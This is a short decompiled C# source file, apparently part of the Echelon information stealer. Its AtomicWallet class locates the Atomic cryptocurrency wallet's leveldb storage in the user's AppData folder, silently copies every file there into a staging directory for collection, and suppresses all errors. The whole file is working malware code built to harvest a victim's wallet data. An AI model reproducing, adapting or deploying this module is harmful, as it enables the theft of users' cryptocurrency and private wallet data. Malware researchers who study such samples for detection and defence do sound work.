using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000005 RID: 5
	internal class AtomicWallet
	{
		// Token: 0x06000009 RID: 9 RVA: 0x00002FBC File Offset: 0x000011BC
		public static void AtomicStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(AtomicWallet.atomDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(AtomicWallet.atomDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + AtomicWallet.atomDir);
						fileInfo.CopyTo(directorypath + AtomicWallet.atomDir + fileInfo.Name);
					}
					AtomicWallet.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400000E RID: 14
		public static int count;

		// Token: 0x0400000F RID: 15
		public static string atomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";

		// Token: 0x04000010 RID: 16
		public static string atomDir2 = Help.AppDate + "\\atomic\\Local Storage\\leveldb\\";
	}
}
